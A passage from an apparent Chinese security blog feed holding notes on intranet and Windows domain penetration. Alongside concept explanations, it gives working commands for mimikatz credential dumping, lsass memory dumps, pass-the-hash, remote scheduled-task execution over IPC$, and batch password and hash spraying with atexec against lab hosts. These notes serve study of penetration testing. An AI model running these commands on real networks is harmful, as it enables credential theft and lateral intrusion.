class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基本信息&quot;&gt;&lt;/a&gt; 基本信息&lt;/h1&gt;
&lt;p&gt;使用的是在线靶场：&lt;a href=&quot;https://hack.zkaq.cn/battle/target?id=1496966ab0</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>内网安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-26T02:32:30.000Z</published>
    <updated>2023-07-05T02:32:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h1><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.png" alt="内网安全" /></p><h2 id="名词"><a class="markdownIt-Anchor" href="#名词"></a> 名词</h2><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f67697465652e636f6d2f736d616c6c2d6c656563682d736872696d702f7479706f72615f7069632f7261772f6d61737465722f36352d312e706e67.png" alt="65-1" /></p><h3 id="dmz"><a class="markdownIt-Anchor" href="#dmz"></a> DMZ</h3><p>英文全名“Demilitarized Zone”，中文含义是“隔离区”，在安全领域的具体含义是“内外网防火墙之间的区域”。DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。</p><p>一般我们攻击web都是DMZ中的服务器，我们如果要获取更加多的敏感信息，需要进一步进行内网攻击。因为一般敏感信息都做了隔离。</p><h3 id="局域网内网"><a class="markdownIt-Anchor" href="#局域网内网"></a> 局域网/内网</h3><p>局域网就是内部网，局域网内部的电脑共用与外部的物理连接</p><h3 id="工作组"><a class="markdownIt-Anchor" href="#工作组"></a> 工作组</h3><p>工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是<strong>将不同的电脑按功能分别列入不同的组中，以方便管理</strong>。它是<strong>最常见最简单最普通的资源管理模式</strong>，就是<strong>将不同的电脑按功能分别列入不同的组中，以方便管理。</strong></p><p>相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是Users目录。不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。所以工作组并不存在真正的集中管理作用。工作组里的所有计算机都是对等的 , 也就是没有服务器和客户机之分的。</p><h3 id="域"><a class="markdownIt-Anchor" href="#域"></a> 域</h3><p>这是一个有安全边界计算机组合（一个域用户没办法访问另一个与用户的资源），域内资源统一由域控制器DC集中管理（通过组策略管理），用户名和密码都是放在域控制器去验证的。</p><h4 id="域控dc"><a class="markdownIt-Anchor" href="#域控dc"></a> 域控DC</h4><p><strong>域控制器</strong>(Domain Controller，DC)是一台<strong>安装并运行Active Directory的服务器</strong>，它包含Active  Directory数据库的可写副本，参与Active Directory复制并控制对网络资源的访问。控制器统一管理帐户数据库、所有的用户登录、资源访问认证及其管理任务。一个域可以有一个或多个域控制器，各域控制器间地位平等，管理员可以在任一台域控制器上更新域中的信息，更新的信息会自动传递到网络中的其他域控制器中。</p><h4 id="活动目录adactivity-dictionary与ntdsdit数据库"><a class="markdownIt-Anchor" href="#活动目录adactivity-dictionary与ntdsdit数据库"></a> 活动目录AD（activity dictionary）与NTDS.dit数据库</h4><p><strong>活动目录</strong>AD是域环境中提供目录服务的组件。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。<strong>安装有AD活动目录的服务器就是域控DC。</strong></p><p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。</p><p>域用户帐户以域数据库的形式保存在活动目录中，<strong>NTDS.dit是活动目录的数据库文件</strong>，该文件记录的信息有以下三张表：</p><ul><li><strong>Schema 表</strong> ：这个表中包含了所有可在活动目录创建的对象信息以及他们之间的相互关系。包括各种类型对象的可选及不可选的各种属性。这个表是活动目录数据库中最小的一个表，但是也是最基础的一个表。</li><li><strong>Link 表</strong> ：Link表包含所有属性的关联，包括活动目录中所有对象的属性的值。一个用户对象的所有属性的类型，包括每个属性的值及用户所属于的组等信息都属于这个表。这个表要大于Schema 表，但与Data 表相比要小。</li><li><strong>Data 表</strong>：活动目录中用户，组，应用程序特殊数据和其他的数据全部保存在Data表中。这是活动目录中存储信息最多的一个表，大量的活动目录的资料实际上还是存储在这个表中。</li></ul><h4 id="ntdsutilexe"><a class="markdownIt-Anchor" href="#ntdsutilexe"></a> Ntdsutil.exe</h4><p>ntdsutil.exe是域控制器自带的<strong>域数据库管理工具</strong>，从windows Server 2008 开始就默认自带了。因此我们<strong>可以通过ntdsutil.exe提取出域中所有的域用户信息。</strong></p><h4 id="域的架构"><a class="markdownIt-Anchor" href="#域的架构"></a> 域的架构</h4><p>单域/域树…</p><h2 id="技术与认证"><a class="markdownIt-Anchor" href="#技术与认证"></a> 技术与认证</h2><h3 id="ipc连接"><a class="markdownIt-Anchor" href="#ipc连接"></a> IPC连接</h3><p>IPC(Internet Process Connection)是共享&quot;命名管道&quot;的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p>建立连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.100\ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;administrator&quot;</span> <span class="comment"># 工作组</span></span><br><span class="line">net use \\192.168.0.100\ipc$<span class="string">&quot;password&quot;</span> /user:domain\username <span class="comment">#域内</span></span><br></pre></td></tr></table></figure><p>传输文件：假如我要传的文件是putty.exe，admin$表示C:\WINDOWS\目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy putty.exe \\192.168.0.100\admin$</span><br></pre></td></tr></table></figure><p>定时执行命令：（CMD）中间的19.45是时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.0.100    <span class="comment"># 查看时间</span></span><br><span class="line">at \\192.168.0.100 19:45 putty.exe <span class="comment"># at指令是win2012之前的</span></span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.3.32 /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /sc DAILY /tr c:\add.bat /F  <span class="comment">#创建 adduser 任务，schtasks &gt;=Windows2012</span></span><br><span class="line">schtasks /run /s 192.168.3.32 /tn adduser /i <span class="comment">#运行 adduser 任务</span></span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn adduser /f<span class="comment">#删除 adduser 任务</span></span><br></pre></td></tr></table></figure><p>磁盘映射与文件操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use Z: \\192.168.0.100\c$ <span class="comment">#映射对方的磁盘C到我们这Z盘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \xx.xx.xx.xx\C$\ <span class="comment"># 查看文件列表</span></span><br><span class="line">net use \xx.xx.xx.xx\C$\1.bat /del <span class="comment"># 删除</span></span><br><span class="line">net view xx.xx.xx.xx <span class="comment"># 查看对方共享</span></span><br></pre></td></tr></table></figure><p>断开：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.100 /del</span><br></pre></td></tr></table></figure><h4 id="常见的错误代码"><a class="markdownIt-Anchor" href="#常见的错误代码"></a> 常见的错误代码</h4><ul><li>5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</li><li>51：网络问题，Windows 无法找到网络路径</li><li>53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题</li><li>67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 <code>ipc$</code></li><li>1219：提供的凭据和已存在的凭据集冲突，说明已建立<code> IPC$</code>，需要先删除</li><li>1326：账号密码错误</li><li>1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</li><li>2242：用户密码过期，目标有账号策略，强制定期更改密码</li></ul><h4 id="失败连接的原因"><a class="markdownIt-Anchor" href="#失败连接的原因"></a> 失败连接的原因</h4><ol><li>目标系统不是 NT 或以上的操作系统</li><li>对方没有打开 IPC$共享</li><li>对方未开启 139、445 端口，或者被防火墙屏蔽</li><li>输出命令、输入账号密码有错误</li></ol><h3 id="ldap连接"><a class="markdownIt-Anchor" href="#ldap连接"></a> LDAP连接</h3><p>这个是基于LINUX的类似共享的机制（差不多是像win的域一样）</p><h3 id="lmntlmwin-hash加密算法"><a class="markdownIt-Anchor" href="#lmntlmwin-hash加密算法"></a> LM&amp;NTLM——Win-hash加密算法</h3><p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><p>NTLM协议具有许多漏洞，可以被中间人攻击、哈希转储攻击、零日漏洞攻击与弱密码攻击等方式利用，虽然因为这些漏洞，许多大企业均采用其他更加安全的协议进行认证（如<strong>Kerberos、OAuth2.0</strong>等），但是很多小企业内网均还使用这种认证方式登录</p><h3 id="wmi"><a class="markdownIt-Anchor" href="#wmi"></a> WMI</h3><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。<strong>而且整个运行过程都在计算机内存中发生，不会留下任何痕迹</strong>。这一点是其它渗透测试工具所不能相比的。</p><p>参考：<a href="https://www.cnblogs.com/-qing-/p/10661480.html">https://www.cnblogs.com/-qing-/p/10661480.html</a></p><h3 id="kerberos协议"><a class="markdownIt-Anchor" href="#kerberos协议"></a> Kerberos协议</h3><p>具体工作方法，在域中，简要介绍一下：</p><ul><li>客户机将明文密码进行 NTLM 哈希,然后<strong>和时间戳</strong>一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)</li><li>将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据</li><li>然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测。</li><li>检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</li></ul><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629111115012.png" alt="image-20230629111115012" /></p><h4 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据"></a> 黄金票据</h4><p>仿造TGT票据可以获取任意Kerberos的访问权限，由KRBTGT NTLM Hash加密，同KDC交互但不同AS交互。</p><h4 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据"></a> 白银票据</h4><p>仿造TGS票据只能访问指定的服务如CIFS，由服务账号NTLM Hash加密，不同KDC交互直接访问Server。</p><h2 id="认知"><a class="markdownIt-Anchor" href="#认知"></a> 认知</h2><h3 id="linux能否进行域渗透"><a class="markdownIt-Anchor" href="#linux能否进行域渗透"></a> Linux能否进行域渗透</h3><ul><li>Q：AD域控制器只在windows server系统能做吗？Linux可以？</li><li>A：linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，个人认为Linux还是比较适合做服务器好一点。（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）</li></ul><h3 id="局域网渗透技术与域渗透技术"><a class="markdownIt-Anchor" href="#局域网渗透技术与域渗透技术"></a> 局域网渗透技术与域渗透技术</h3><p>不同的攻击技术手段适用面不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。</p><h3 id="工作组和域的区别"><a class="markdownIt-Anchor" href="#工作组和域的区别"></a> 工作组和域的区别</h3><ul><li>工作组：地位平等，管理分散，没有集中管理。</li><li>域环境：地位不平等，管理集中，实现集中管理。</li><li>域环境也可以简单的理解为工作组的升级版，更好管理。</li><li>这里我们把域环境和工作组区分开来是因为他们的攻击手段不同，工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</li></ul><h1 id="基本信息搜集"><a class="markdownIt-Anchor" href="#基本信息搜集"></a> 基本信息搜集</h1><h2 id="主机服务信息"><a class="markdownIt-Anchor" href="#主机服务信息"></a> 主机&amp;服务信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line">net start 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br></pre></td></tr></table></figure><p>探针域内主机角色及服务信息</p><ul><li>利用开放端口服务及计算机名判断</li><li>核心业务机器：<ul><li>1.高级管理人员，系统管理员，财务/人事、业务人员的个人计算机</li><li>2.产品管理系统服务器</li><li>3.办公系统服务器</li><li>4.财务应用系统服务器</li><li>5.核心产品源码服务器</li><li>6.数据库服务器</li><li>7.文件或者网盘服务器</li><li>8.电子邮件服务器</li><li>9.网络监控系统服务器</li><li>10.其他服务器（内部技术文档服务器，其他监控服务器）</li></ul></li></ul><h2 id="网络信息"><a class="markdownIt-Anchor" href="#网络信息"></a> 网络信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all     判断存在域-dns</span><br><span class="line">net view /domain  判断存在域</span><br><span class="line">net time /domain  判断主域</span><br><span class="line">netstat -ano      当前网络端口开放</span><br><span class="line">nslookup     域名 追踪来源地址</span><br></pre></td></tr></table></figure><h3 id="判断存在域"><a class="markdownIt-Anchor" href="#判断存在域"></a> 判断存在域</h3><h4 id="dns后缀"><a class="markdownIt-Anchor" href="#dns后缀"></a> dns后缀</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>不存在域，则没有东西</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626160854405.png" alt="image-20230626160854405" /></p><p>存在域</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626160912551.png" alt="image-20230626160912551" /></p><h4 id="net-view与net-time查看域与主域"><a class="markdownIt-Anchor" href="#net-view与net-time查看域与主域"></a> net view与net time查看域与主域</h4><p><code>net view /domain</code>是判断是否存在域</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626161203266.png" alt="image-20230626161203266" style="zoom: 80%;" /><p><code>net time /domain</code>是判断主域</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626161229177.png" alt="image-20230626161229177" style="zoom: 80%;" /><h4 id="域控ip反查"><a class="markdownIt-Anchor" href="#域控ip反查"></a> 域控IP反查</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup &lt;域控制器全名&gt;  </span><br><span class="line">ping &lt;域控制器全名&gt;  </span><br></pre></td></tr></table></figure><h2 id="用户信息搜集"><a class="markdownIt-Anchor" href="#用户信息搜集"></a> 用户信息搜集</h2><h3 id="系统默认常见用户身份"><a class="markdownIt-Anchor" href="#系统默认常见用户身份"></a> 系统默认常见用户身份</h3><ul><li>Domain Admins：域管理员（默认对域控制器有完全控制权）</li><li>Domain Computers：域内机器</li><li>Domain Controllers：域控制器</li><li>Domain Guest：域访客，权限低</li><li>Domain Users：域用户</li><li>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</li></ul><p>我们主要攻击<strong>Domain Admains</strong>和<strong>Enterprise Admains</strong> 大部分成员主机在 Domain Users 域用户里</p><h3 id="相关用户搜集"><a class="markdownIt-Anchor" href="#相关用户搜集"></a> 相关用户搜集</h3><ul><li><code>whoami /all</code> 用户权限</li><li><code>net config workstation</code> 登录信息</li><li><code>net user</code> 本地用户</li><li><code>net localgroup</code> 本地用户组</li><li><code>net user /domain</code> 获取域用户信息</li><li><code>net group /domain</code> 获取域用户组信息</li><li><code>wmic useraccount get /all</code> 涉及域用户详细信息</li><li><code>net group &quot;Domain Admins&quot; /domain</code> 查询域管理员账户</li><li><code>net group &quot;Enterprise Admins&quot; /domain</code> 查询管理员用户组</li><li><code>net group &quot;Domain Controllers&quot; /domain</code> 查询域控制器</li></ul><h3 id="涉及域用户详细信息"><a class="markdownIt-Anchor" href="#涉及域用户详细信息"></a> 涉及域用户详细信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><h2 id="凭据信息搜集"><a class="markdownIt-Anchor" href="#凭据信息搜集"></a> 凭据信息搜集</h2><p>旨在<strong>收集各种密文，明文，口令</strong>等，为后续<strong>横向渗透</strong>做好测试准备，包括</p><ul><li><p>计算机用户HASH</p></li><li><p>明文获取</p><ul><li><p><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>(win)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">log</span><br><span class="line"># 初始化</span><br><span class="line">privilege ::debug</span><br><span class="line"># 抓取内存中的凭证</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"># 导出凭证</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line"># 进行PTH传递</span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:god.org/ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd</span><br></pre></td></tr></table></figure><p>如果mimikatz被杀了，那么可以使用<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a>把内存先dump下来，然后再下载到本地，在本地使用Mimikatz来解析！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"><span class="comment"># mimikatz</span></span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li><li><p>kivi（msf集成）</p></li><li><p><a href="https://github.com/huntergregal/mimipenguin/releases/">mimipenguin</a>(linux)</p></li></ul></li><li><p>计算机各种协议服务口令获取</p><ul><li><p><a href="https://github.com/AlessandroZ/LaZagne/releases/">LaZagne</a>(all)</p></li><li><p><a href="https://xenarmor.com/allinone-password-recovery-pro-software">XenArmor</a>(win)</p><p>这两个软件主要是通过自动化翻找以下内容，从而获取凭据。</p><ul><li>1.站点源码备份文件，数据库备份文件等</li><li>2.各类数据库WEB管理入口，如PHPmyadmin</li><li>3.浏览器保存密码，浏览器cookies</li><li>4.其他用户会话，3389和ipc$连接记录，回收站内容</li><li>5.windows 保存的WIFI密码</li><li>6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</li></ul></li><li><p><code>Netsh WLAN show profiles </code></p></li><li><p><code>Netsh WLAN show profile name=&quot;无线名称&quot; key=clear</code></p></li></ul></li></ul><h2 id="探寻域控架构存活主机探测"><a class="markdownIt-Anchor" href="#探寻域控架构存活主机探测"></a> 探寻域控架构——存活主机探测</h2><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><p>nbtscan工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan 192.168.3.0/24 </span><br></pre></td></tr></table></figure><p>自带内部命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr <span class="string">&quot;TTL=&quot;</span> </span><br></pre></td></tr></table></figure><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><h3 id="nishang"><a class="markdownIt-Anchor" href="#nishang"></a> NiShang</h3><p><a href="https://github.com/samratashok/nishang">NiShang</a>：利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，它集成了框架、脚本和各种payload。</p><p>导入模块 nishang</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\nishang.psm1</span><br></pre></td></tr></table></figure><p>设置执行策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure><p>获取模块 nishang 的命令函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Command -Module nishang</span><br></pre></td></tr></table></figure><p>获取常规计算机信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Information</span><br></pre></td></tr></table></figure><p>端口扫描（查看目录对应文件有演示语法，其他同理）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 192.168.80.0 -EndAddress 192.168.80.100 -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure><p>其他功能：删除补丁，反弹 Shell，凭据获取等</p><h3 id="impacket"><a class="markdownIt-Anchor" href="#impacket"></a> Impacket</h3><p>Impacket工具包介绍：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p><p>impacket工具包下载，可下载exe版本：</p><ul><li><a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></li><li><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li></ul><h3 id="ladon"><a class="markdownIt-Anchor" href="#ladon"></a> Ladon</h3><p><strong>国产Ladon内网杀器测试验收</strong></p><p>信息收集-协议扫描-漏洞探针-传递攻击等</p><p>官网：<a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p><p>具体用法请查看官网wiki，举例如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫当前机器所处C段的存活主机，其它模块同理</span></span><br><span class="line">Ladon.exe 192.168.1.8/24 OnlinePC </span><br><span class="line"><span class="comment"># 扫当前机器所处C段操作系统版本，其它模块同理</span></span><br><span class="line">Ladon.exe 192.168.1.8/24 OsScan </span><br><span class="line"><span class="comment"># 扫当前机器所处C段的ssh端口，其它模块同理</span></span><br><span class="line">Ladon.exe 192.168.1.8/24 MysqlScan</span><br><span class="line"><span class="comment"># 扫当前机器所处C段的永恒之蓝漏洞，其它模块同理</span></span><br><span class="line">Ladon 192.168.1.8/24 MS17010</span><br></pre></td></tr></table></figure><h2 id="其他协议"><a class="markdownIt-Anchor" href="#其他协议"></a> 其他——协议</h2><h3 id="netbios探信息"><a class="markdownIt-Anchor" href="#netbios探信息"></a> NetBios——探信息</h3><p>NetBios是网络基本输入输出系统，通过这个协议，可以得到局域网内的主机信息，在windows下可以使用nbtstat查看netbios信息：<code>nbtstat -A &lt;ip&gt;</code>。</p><p>向内网发送这个协议的数据包，可以得到局域网内机器的计算机名、工作组、MAC地址。</p><h1 id="域横向传递"><a class="markdownIt-Anchor" href="#域横向传递"></a> 域横向【传递】</h1><p>拿下一台主机后，通过本地信息西欧及用户凭证，如何进行横向渗透拿下更多主机？</p><p>假设有：</p><ul><li><p>当前机器名称：<a href="http://webserver.god.org">webserver.god.org</a>，192.168.3.31</p></li><li><p>当前机器用户账户密码</p></li><li><p>本地管理员账号密码：<code>.\administrator:admin!@#45 </code></p></li><li><p>当前机器域用户密码：<code>god\webadmin:admin!@#45</code></p></li><li><p>域：<a href="http://god.org">god.org</a></p></li><li><p>域控ip——192.168.3.21</p><ul><li>Username : administrator</li><li>Domain   : <a href="http://god.org">god.org</a></li><li>Password : Admin12345</li></ul></li><li><p>域内其他用户ip</p><ul><li>192.168.3.25</li><li>192.168.3.29</li><li>192.168.3.30</li><li>192.168.3.32</li></ul></li></ul><h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2><ol><li><p>得到webshell主机后，对主机的密码明文或者哈希进行抓取，具体参考：凭据信息搜集</p></li><li><p>对其他主机进行扫描，扩大攻击面：具体参考：探寻域控架构——存活主机探测</p></li><li><p>当获取到一些重要的明文密码/哈希值时，我们可以用这些值进行爆破/碰撞，发现使用相同密码的用户，然后进行哈希传递/明文密码等横向<strong>传递</strong>。有很多种方法，具体参考后面的章节。包括：</p><p>传递完成即找到碰撞的用户，那么可以在<strong>这些用户上再拿下凭证</strong>，添加到我们的库中，完成搜集，然后批量进行传递。</p></li><li><p>传递之后，整体上线CS，使用PTT进行权限维持（黄金票据和白银票据）</p></li><li><p>尝试建立ipc链接，如果成功，那么就可以保存，然后操作</p></li></ol><p>如果有能横向的机子，通常使用的有：<code>$ipc</code>链接，将文件上传到别的机子，然后再操作。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629134037534.png" alt="image-20230629134037534" /></p><h2 id="域横向扫描atschtasks定时任务明文传递"><a class="markdownIt-Anchor" href="#域横向扫描atschtasks定时任务明文传递"></a> 域横向扫描——at&amp;schtasks定时任务&amp;明文传递</h2><p>之前说道AT和SCHTASKS是在提权的时候。是利用系统缺陷，当我们使用定时任务执行命令的时候，使用的是system权限。但是这个是通过ipc的。</p><h3 id="明文传递"><a class="markdownIt-Anchor" href="#明文传递"></a> 明文传递</h3><ol><li>建立 IPC 链接到目标主机：<code>net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator</code></li><li>拷贝要执行的命令脚本到目标主机：<code>copy add.bat \\192.168.3.21\c$</code></li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本：<code>at \\192.168.3.21 15:47 c:\add.bat</code></li><li>删除 IPC 链接</li></ol><p>当然里面的<code>at</code>指令可以替换成<code>atexec</code>，他是impacket上的工具，因为是第三方工具，易被查杀，需要做免杀。</p><p>操作：【它也可以进行哈希传递】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 <span class="string">&quot;whoami&quot;</span> <span class="comment"># 哈希传递</span></span><br></pre></td></tr></table></figure><h3 id="批量检测"><a class="markdownIt-Anchor" href="#批量检测"></a> 批量检测</h3><p>首先把前期搜集来的域内IP地址存在ips.txt中，然后把搜集来的明文密码存在pass.txt中，把哈希存在hash.txt中。然后将对应的语句弄成<code>bat</code>文件，在自己电脑运行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %%i in (ips.txt) do net use \%%i\ipc$ &quot;admin!@#45&quot; /user:administrator </span><br><span class="line">#批量检测IP对应明文连接</span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line">#批量检测IP对应明文回显版</span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami </span><br><span class="line">#批量检测明文对应IP回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami </span><br><span 